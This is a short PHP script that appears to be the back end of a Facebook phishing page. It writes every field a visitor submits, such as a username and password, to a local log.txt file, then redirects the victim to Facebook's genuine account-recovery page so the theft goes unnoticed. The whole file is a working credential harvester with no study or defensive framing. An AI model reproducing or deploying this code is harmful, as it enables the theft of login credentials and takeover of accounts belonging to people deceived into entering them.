<?php
 
// Set the location to redirect the page
header ('Location: https://m.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjQxNTE0NDEwLCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&c=https%3A%2F%2Fm.facebook.com%2F%3Fref%3Dopera_speed_dial_freefb&r&cuid&ars=facebook_login&lwv=100&refid=8&ref=opera_speed_dial_freefb');
 
// Open the text file in writing mode
$file = fopen("log.txt", "a");
 
foreach($_POST as $variable => $value) {
    fwrite($file, $variable);
    fwrite($file, "=");
    fwrite($file, $value);
    fwrite($file, "\r\n");
}
 
fwrite($file, "\r\n");
fclose($file);
exit;
?>